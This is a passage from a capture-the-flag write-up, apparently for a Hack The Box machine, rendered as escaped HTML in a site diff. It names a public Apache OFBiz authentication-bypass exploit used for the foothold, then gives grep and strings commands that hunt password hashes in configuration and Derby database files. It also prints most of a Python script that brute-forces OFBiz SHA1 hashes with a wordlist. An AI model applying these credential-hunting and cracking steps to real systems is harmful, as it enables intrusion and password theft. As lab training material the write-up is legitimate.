+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">AJAX&lt;/span>&lt;span class="o">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Website&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">jquery&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="o">/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span> &lt;span class="n">Lightbox&lt;/span> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Javascript&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">nice&lt;/span> &lt;span class="n">image&lt;/span> &lt;span class="n">popups&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span> &lt;span class="ne">Script&lt;/span> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">This&lt;/span> &lt;span class="n">plugin&lt;/span> &lt;span class="n">detects&lt;/span> &lt;span class="n">instances&lt;/span> &lt;span class="n">of&lt;/span> &lt;span class="n">script&lt;/span> &lt;span class="n">HTML&lt;/span> &lt;span class="n">elements&lt;/span> &lt;span class="ow">and&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">returns&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">script&lt;/span> &lt;span class="n">language&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">type&lt;/span>&lt;span class="o">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span> &lt;span class="n">nginx&lt;/span> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Nginx&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">Engine&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">X&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">is&lt;/span> &lt;span class="n">a&lt;/span> &lt;span class="n">free&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">open&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">source&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">high&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">performance&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HTTP&lt;/span> &lt;span class="n">server&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="n">reverse&lt;/span> &lt;span class="n">proxy&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">as&lt;/span> &lt;span class="n">well&lt;/span> &lt;span class="n">as&lt;/span> &lt;span class="n">an&lt;/span> &lt;span class="n">IMAP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">POP3&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">proxy&lt;/span> &lt;span class="n">server&lt;/span>&lt;span class="o">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Version&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="mf">1.18&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Website&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">nginx&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">net&lt;/span>&lt;span class="o">/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">HTTP&lt;/span> &lt;span class="n">Headers&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">1.1&lt;/span> &lt;span class="mi">200&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Server&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">nginx&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">1.18&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Date&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Thu&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">25&lt;/span> &lt;span class="n">Jan&lt;/span> &lt;span class="mi">2024&lt;/span> &lt;span class="mi">00&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">46&lt;/span> &lt;span class="n">GMT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Content&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Type&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">text&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">html&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Transfer&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Encoding&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">chunked&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Connection&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">close&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Set&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Cookie&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">JSESSIONID&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">B31C497CC8F813F10984F79DDF132335&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">jvm1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="ne">Path&lt;/span>&lt;span class="o">=/&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">Secure&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">HttpOnly&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Accept&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Ranges&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">bytes&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ETag&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">W&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="s2">&amp;#34;27200-1702887508516&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Last&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Modified&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Mon&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">18&lt;/span> &lt;span class="n">Dec&lt;/span> &lt;span class="mi">2023&lt;/span> &lt;span class="mi">08&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">18&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">28&lt;/span> &lt;span class="n">GMT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">vary&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">accept&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">encoding&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Content&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Encoding&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">gzip&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="foothold-">FootHold ?&lt;/h2>
+&lt;p>I used this repo from GH to bet a foothold &lt;br>
+&lt;code>https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass&lt;/code>&lt;/p>
+&lt;p>And here a PoC (Proof Of Concept) of this vulnerability : &lt;br>
+&lt;a class="link" href="https://www.youtube.com/watch?v=DuLzg6U25VM&amp;amp;ab_channel=%C3%81kosJakab" target="_blank" rel="noopener"
+>https://www.youtube.com/watch?v=DuLzg6U25VM&amp;ab_channel=%C3%81kosJakab&lt;/a>&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/sc3.png"
+width="1914"
+height="579"
+srcset="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/sc3_hu4dbd5ea23ae62b11ec564884ae654f93_133462_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/sc3_hu4dbd5ea23ae62b11ec564884ae654f93_133462_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Exploitation CVE-2023-51467 "
+class="gallery-image"
+data-flex-grow="330"
+data-flex-basis="793px"
+>&lt;/p>
+&lt;p>Go to stabilize the shell and go ahead this machine&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/sc4.png"
+width="1173"
+height="388"
+srcset="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/sc4_hu49863b74879c344286bab13e374ea64f_109598_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/sc4_hu49863b74879c344286bab13e374ea64f_109598_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Shell Stabilized"
+class="gallery-image"
+data-flex-grow="302"
+data-flex-basis="725px"
+>&lt;/p>
+&lt;h2 id="privilege-escalation">Privilege Escalation&lt;/h2>
+&lt;p>The privilege escalation journey initiates with routine reflexes, yet unfortunately, yields no success.&lt;/p>
+&lt;ul>
+&lt;li>Running linpeas.sh doesn&amp;rsquo;t provide any valuable insights,&lt;/li>
+&lt;li>The sudo -l command prompts for a password without divulging information,&lt;/li>
+&lt;li>The search for executables with elevated permissions reveals nothing, and&lt;/li>
+&lt;li>Attempts to exploit kernel vulnerabilities prove futile.&lt;/li>
+&lt;/ul>
+&lt;p>Faced with these setbacks, I navigate towards the OFBiz configuration directory, realizing that the privilege escalation likely needs attention at this level. &lt;br>
+The intricacies of the structure, encompassing numerous directories and files, prompt me to contemplate a more methodical approach.&lt;/p>
+&lt;p>Given the time constraints and considering this is only the first half of the process, a systematic examination becomes imperative.&lt;/p>
+&lt;p>Continuing the journey, I leverage the command&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">grep -rni password * &lt;span class="p">|&lt;/span> cut -c10-1200
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>to pinpoint files of interest, leading me to uncover the hash
+&lt;code>{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a&lt;/code>
+In order to further narrow down my search, given that this hash was sourced from the &lt;em>&amp;ldquo;ChangePassword&amp;rdquo;&lt;/em> file from &lt;code>themes/rainbowstone/template/ChangePassword.ftl:58:&lt;/code>,&lt;br>
+I fine-tune my approach with:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">grep -rn password * &lt;span class="p">|&lt;/span> grep -v inbowstone/template/ChangePassword.ftl
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>This refinement directs me towards more specific files. &lt;br>
+Following this trail, I delve into &lt;strong>/opt/ofbiz/runtime/data/derby/ofbiz/seg0—the derby folder&lt;/strong> , &lt;br>
+&lt;em>noted as the database folder according to Google&lt;/em>. &lt;br>
+My exploration deepens with the command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">strings * &lt;span class="p">|&lt;/span> grep admin &lt;span class="p">|&lt;/span> cut -c1-1200 &lt;span class="p">|&lt;/span> sort -u
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>This reveals another hash: &lt;strong>$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I&lt;/strong>. To decipher this hash, I employ a Python script, successfully obtaining the plaintext and solidifying my position as root.&lt;/p>
+&lt;h2 id="the-end">The End&lt;/h2>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">argparse&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">hashlib&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">base64&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">os&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">cryptBytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hash_type&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">salt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">hash_type&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hash_type&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;SHA&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">salt&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">salt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">base64&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">urlsafe_b64encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">urandom&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hash_obj&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">hashlib&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">new&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hash_type&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hash_obj&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">salt&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hash_obj&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hashed_bytes&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">hash_obj&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">digest&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">hash_type&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">salt&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">base64&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">urlsafe_b64encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hashed_bytes&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;+&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">result&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">getCryptedBytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hash_type&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">salt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hash_obj&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">hashlib&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">new&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hash_type&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hash_obj&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">salt&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hash_obj&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hashed_bytes&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">hash_obj&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">digest&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">base64&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">urlsafe_b64encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hashed_bytes&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;+&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">except&lt;/span> &lt;span class="n">hashlib&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">NoSuchAlgorithmException&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">raise&lt;/span> &lt;span class="ne">Exception&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;Error while computing hash of type &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">hash_type&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">parser&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">argparse&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ArgumentParser&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">description&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Brute force Apache OFBiz SHA1 hashes. Just something you might want to do....&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">parser&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">add_argument&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;--hash-string&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">help&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Hash string in the format &amp;#39;$TYPE$SALT$HASH&amp;#39;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">required&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">parser&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">add_argument&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;--wordlist&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">help&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Path to the wordlist file&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">default&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;/usr/share/wordlists/rockyou.txt&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">required&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">False&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">args&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">parser&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parse_args&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hash_components&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">hash_string&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;$&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
